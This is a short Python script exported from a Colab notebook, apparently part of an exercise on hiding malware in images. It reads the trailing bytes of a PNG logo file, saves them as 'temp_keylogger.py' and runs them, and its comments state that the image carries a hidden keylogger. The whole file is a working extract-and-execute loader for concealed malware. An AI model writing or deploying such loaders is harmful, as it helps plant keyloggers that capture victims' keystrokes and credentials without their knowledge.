# -*- coding: utf-8 -*-
"""unknown2473_extractNrun.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/159sGfOqV_EipwfFTA6maALXqeDnpt5lE
"""

import os

def extract_and_run_keylogger(image_file):
    with open(image_file, "rb") as img:
        # Look at the last 1024 bytes for the hidden code (adjust the length based on the size of your script)
        img.seek(-1024, os.SEEK_END)
        hidden_code = img.read()

        # Save the extracted code to a temporary Python file
        with open("temp_keylogger.py", "wb") as f:
            f.write(hidden_code)

        # Execute the extracted Python code (the keylogger)
        os.system("python3 temp_keylogger.py")

if __name__ == "__main__":
    image_file = "UPMlogo_wKeylogger.png"  # Path to the image containing the keylogger
    extract_and_run_keylogger(image_file)